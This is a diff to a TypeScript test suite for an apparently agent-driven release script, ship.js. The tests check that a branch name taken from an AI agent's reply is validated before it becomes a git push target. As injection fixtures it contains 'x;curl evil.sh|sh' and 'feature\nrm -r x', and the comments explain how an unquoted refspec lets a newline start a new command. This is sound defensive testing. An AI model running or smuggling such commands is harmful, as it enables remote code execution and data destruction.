@@ -57,6 +57,34 @@ const PUSH_TARGET_END = "// ──── PUSH-TARGET-CURRENCY-END ────";
 const DECISION_SIGNATURE = "function reusablePriorBranch(prior) {";
 
 /**
+ * ship.js's own `isSafeBranchName`, lifted by slice rather than re-spelled
+ * here (#1103).
+ *
+ * The block calls it now, so the sandbox has to supply it — and a second copy
+ * written in this file would be two deciders that agree, which is the defect
+ * `.claude/rules/checks-must-be-able-to-fail.md` names as its fourth shape.
+ * Slicing means a change to the real predicate changes what these rows run.
+ */
+function sliceDeclaration(from: string, label: string): string {
+  const start = shipSource.indexOf(from);
+  if (start === -1) throw new Error(`ship.js no longer declares ${label}`);
+  const end = shipSource.indexOf("\n}", start);
+  if (end === -1) throw new Error(`ship.js's ${label} has no closing brace`);
+  return shipSource.slice(start, end + 2);
+}
+
+const SAFE_BRANCH_SOURCE = [
+  sliceDeclaration("const SAFE_BRANCH =", "isSafeBranchName"),
+  sliceDeclaration("function bareBranchName(ref) {", "bareBranchName"),
+  // One line, so it has no closing brace of its own.
+  (() => {
+    const line = shipSource.split("\n").find(l => l.startsWith("const DEFAULT_BRANCHES ="));
+    if (!line) throw new Error("ship.js no longer declares DEFAULT_BRANCHES");
+    return line;
+  })(),
+].join("\n");
+
+/**
  * The mutation: the decision collapses to what ship.js did before #185 —
  * take whatever detection nominated.
  */
@@ -95,10 +123,22 @@ interface PushTargetOutcome {
 }
 
 /** Execute one copy of the block over a prior-branch nomination. */
-function runBlock(block: string, prior: unknown): PushTargetOutcome {
+function runBlock(
+  block: string,
+  prior: unknown,
+  /**
+   * The branch the project checkout was on at launch. `reusablePriorBranch`
+   * refuses a nomination equal to it, which is how a consumer whose default
+   * branch is neither `main` nor `master` is covered (#1113). Defaults to a
+   * work branch, so the rows below measure the `DEFAULT_BRANCHES` half unless
+   * they say otherwise.
+   */
+  primaryBranchBefore = "185-deep-modules-checkout",
+): PushTargetOutcome {
   const logs: string[] = [];
   const scope: Record<string, unknown> = {
     priorBranchResult: prior,
+    primaryBranchBefore,
     log: (m: unknown) => logs.push(String(m)),
   };
   const sandbox = new Proxy(scope, {
@@ -112,7 +152,7 @@ function runBlock(block: string, prior: unknown): PushTargetOutcome {
   });
   const factory = new Function(
     "__scope__",
-    `with (__scope__) {\n${block}\nreturn { branchToReuse, pushTarget }\n}`,
+    `with (__scope__) {\n${SAFE_BRANCH_SOURCE}\n${block}\nreturn { branchToReuse, pushTarget }\n}`,
   );
   const out = factory(sandbox) as { branchToReuse: string | null; pushTarget: string };
   return { ...out, logs };
@@ -148,6 +188,186 @@ describe("ship.js: a stale prior branch is not a push target (#185)", () => {
     const real = runBlock(PUSH_TARGET_BLOCK, CURRENT);
     expect(real.branchToReuse).toBe("185-deep-modules");
     expect(real.pushTarget).toBe("HEAD:185-deep-modules");
+  });
+
+  test("a nomination that is not a branch name never reaches the push target (#1103)", () => {
+    // `prior.branch` is `priorResult.priorBranch` out of the prior-branch
+    // AGENT's reply — unconstrained text, not a ref git ever resolved — and
+    // one line below this it becomes `HEAD:${branchToReuse}` in a prompt the
+    // commit agent runs. `isSafeBranchName` guarded the OTHER consumer of the
+    // same value, 116 lines after that interpolation: a validator reading a
+    // value a shell had already run.
+    //
+    // Refusing rather than quoting is the point. A quoted bad branch name is
+    // inert, not correct — the push still goes to a ref nobody chose.
+    const HOSTILE = { ...CURRENT, branch: "x;curl evil.sh|sh" };
+    const real = runBlock(PUSH_TARGET_BLOCK, HOSTILE);
+    expect(real.branchToReuse).toBeNull();
+    expect(real.pushTarget).toBe("HEAD");
+    expect(real.logs.join("\n")).toContain("not a usable branch name");
+
+    // The removal, performed and observed: the value reaches the push target
+    // verbatim, which is what main does today.
+    const mutant = runBlock(buildMutantBlock(), HOSTILE);
+    expect(mutant.pushTarget).toBe("HEAD:x;curl evil.sh|sh");
+  });
+
+  test("a nomination of the default branch composes no push to it (#1113)", () => {
+    // The cheapest wrong fix for #1103 is the one that shipped, and it is a
+    // row rather than an apology: `isSafeBranchName('main')` is TRUE, so the
+    // first version of the hoist let `{branch: 'main', isMerged: false,
+    // isBehind: false}` straight through to `HEAD:main`. A test asserting
+    // that `isSafeBranchName` is CALLED passes against a tree that pushes to
+    // main — which is why this row reads the composed target instead.
+    const MAIN = { ...CURRENT, branch: "main" };
+    const out = runBlock(PUSH_TARGET_BLOCK, MAIN);
+
+    // Not "composed differently" — the branch is not named in anything this
+    // block produces. `HEAD:main`, `main`, and any other spelling of it fail
+    // this line together.
+    expect(`${out.branchToReuse ?? ""} ${out.pushTarget}`).not.toContain("main");
+    expect(out.pushTarget).toBe("HEAD");
+
+    // The removal, performed: without the check the push target is the
+    // default branch, which is #136 with a green suite over it.
+    expect(runBlock(buildMutantBlock(), MAIN).pushTarget).toBe("HEAD:main");
+  });
+
+  test("the fully-qualified spellings of the default branch are the same case", () => {
+    // `HEAD:refs/heads/main` reaches the same place, and `isSafeBranchName`
+    // accepts it — SAFE_BRANCH allows `/`. Normalise, then compare.
+    for (const branch of ["refs/heads/main", "origin/main", "refs/remotes/origin/main", "master"]) {
+      const out = runBlock(PUSH_TARGET_BLOCK, { ...CURRENT, branch });
+      expect(out.pushTarget, `"${branch}" reached the push target`).toBe("HEAD");
+      expect(`${out.branchToReuse ?? ""} ${out.pushTarget}`).not.toContain("main");
+    }
+    // A fully-qualified ref is refused even when it is NOT the default
+    // branch: the push target is a bare name, and `HEAD:refs/heads/x` is a
+    // different string arriving at the same argument.
+    expect(runBlock(PUSH_TARGET_BLOCK, { ...CURRENT, branch: "refs/heads/254-fix" }).pushTarget).toBe("HEAD");
+  });
+
+  test("the value that cleared the refusals is the value that is returned", () => {
+    // Every refusal reads `nominated`, the TRIMMED copy. Returning
+    // `prior.branch` would validate one representation and emit a different
+    // one, and `.trim()` is what makes that exploitable rather than cosmetic:
+    // `"feature\n"` trims to `feature`, clears every refusal, and the raw
+    // value reaches
+    //   git -C ${shellQuote(commitDir)} push -u origin ${pushTarget}
+    // where the refspec is the UNQUOTED half. A newline there ends the
+    // command and whatever follows on the line becomes a new one. Quoting
+    // `commitDir` does nothing about it.
+    const real = runBlock(PUSH_TARGET_BLOCK, { ...CURRENT, branch: "feature\n" });
+    expect(real.pushTarget).toBe("HEAD:feature");
+    expect(real.pushTarget).not.toContain("\n");
+
+    // Leading whitespace is the same defect wearing a different hat: a raw
+    // `" feature"` splits into two arguments at the git call.
+    expect(runBlock(PUSH_TARGET_BLOCK, { ...CURRENT, branch: " feature" }).pushTarget).toBe(
+      "HEAD:feature",
+    );
+
+    // The mutant: return the raw nomination, which is what this file looked
+    // like before. Without it the row passes against a block that never
+    // trimmed at all.
+    const RAW_RETURN = "if (refusals.length === 0) return nominated";
+    expect(PUSH_TARGET_BLOCK.split(RAW_RETURN).length - 1).toBe(1);
+    const mutant = runBlock(
+      PUSH_TARGET_BLOCK.replace(RAW_RETURN, "if (refusals.length === 0) return prior.branch"),
+      { ...CURRENT, branch: "feature\n" },
+    );
+    expect(mutant.pushTarget).toBe("HEAD:feature\n");
+
+    // Interior whitespace is refused outright rather than trimmed — the shape
+    // check sees it, because `.trim()` only touches the ends.
+    expect(runBlock(PUSH_TARGET_BLOCK, { ...CURRENT, branch: "feature\nrm -r x" }).pushTarget).toBe(
+      "HEAD",
+    );
+  });
+
+  test("a qualified ref is refused by its first segment, not by a substring", () => {
+    // `/^refs\//` plus `'/heads/'` plus `'/remotes/'` needs a leading slash,
+    // so these two reached `main` through git's DWIM while the suite was
+    // green. `origin/main` refused before this change, but via the
+    // `bareBranchName` arm — meaning `origin/some-branch` did NOT refuse, and
+    // the row was passing for a reason that did not generalise.
+    for (const branch of [
+      "heads/main",
+      "remotes/origin/main",
+      "tags/v1",
+      "origin/some-branch",
+      "ORIGIN/main",
+      "Refs/heads/main",
+    ]) {
+      expect(
+        runBlock(PUSH_TARGET_BLOCK, { ...CURRENT, branch }).pushTarget,
+        `"${branch}" reached the push target`,
+      ).toBe("HEAD");
+    }
+
+    // The controls, or this row is satisfied by refusing every name that
+    // contains one of those words anywhere.
+    for (const branch of ["fix/origin-parsing", "feature/tags/v1"]) {
+      expect(
+        runBlock(PUSH_TARGET_BLOCK, { ...CURRENT, branch }).pushTarget,
+        `"${branch}" is a legitimate branch name and it was refused`,
+      ).toBe(`HEAD:${branch}`);
+    }
+  });
+
+  test("the default-branch comparison is case-folded", () => {
+    // `DEFAULT_BRANCHES.has` is exact, so `Main` is not `main` to a Set while
+    // it is to a case-insensitive checkout.
+    for (const branch of ["Main", "MASTER", "Origin/Main"]) {
+      expect(
+        runBlock(PUSH_TARGET_BLOCK, { ...CURRENT, branch }).pushTarget,
+        `"${branch}" reached the push target`,
+      ).toBe("HEAD");
+    }
+    // …and the same fold on the launch branch, which is the arm that covers a
+    // consumer whose default is neither name.
+    expect(runBlock(PUSH_TARGET_BLOCK, { ...CURRENT, branch: "Develop" }, "develop").pushTarget).toBe(
+      "HEAD",
+    );
+
+    // The control: folding case must not swallow names that merely start the
+    // same way.
+    expect(runBlock(PUSH_TARGET_BLOCK, { ...CURRENT, branch: "Mainline" }).pushTarget).toBe(
+      "HEAD:Mainline",
+    );
+  });
+
+  test("a consumer whose default branch is neither main nor master is covered", () => {
+    // `DEFAULT_BRANCHES` cannot know a downstream project's default. The
+    // branch the checkout was on when this run launched can, and it is the
+    // #136 fact in the first place.
+    const out = runBlock(PUSH_TARGET_BLOCK, { ...CURRENT, branch: "develop" }, "develop");
+    expect(out.pushTarget).toBe("HEAD");
+
+    // The control: the same nomination is reused when it is NOT what the
+    // checkout sits on, or this row would be refusing every branch named
+    // develop everywhere.
+    expect(runBlock(PUSH_TARGET_BLOCK, { ...CURRENT, branch: "develop" }, "main").pushTarget).toBe(
+      "HEAD:develop",
+    );
+  });
+
+  test("the shape check refuses the near misses, and passes the branch names this repo uses", () => {
+    // Without the second half this row would be satisfied by a check that
+    // refuses everything, and the orphan-branch problem #515 solved would be
+    // back with a green suite over it.
+    for (const branch of ["-delete", "a..b", "feat/", "x.lock", "a//b", "", "has space"]) {
+      expect(
+        runBlock(PUSH_TARGET_BLOCK, { ...CURRENT, branch }).pushTarget,
+        `"${branch}" was accepted as a push target`,
+      ).toBe("HEAD");
+    }
+    for (const branch of ["run/254-fix.v2", "1056-prompt-cd", "fix/a_b-c"]) {
+      expect(
+        runBlock(PUSH_TARGET_BLOCK, { ...CURRENT, branch }).pushTarget,
+        `"${branch}" is a branch name this repository creates, and it was refused`,
+      ).toBe(`HEAD:${branch}`);
+    }
   });
 
   test("a branch behind the base is refused, and the mutant reuses it", () => {
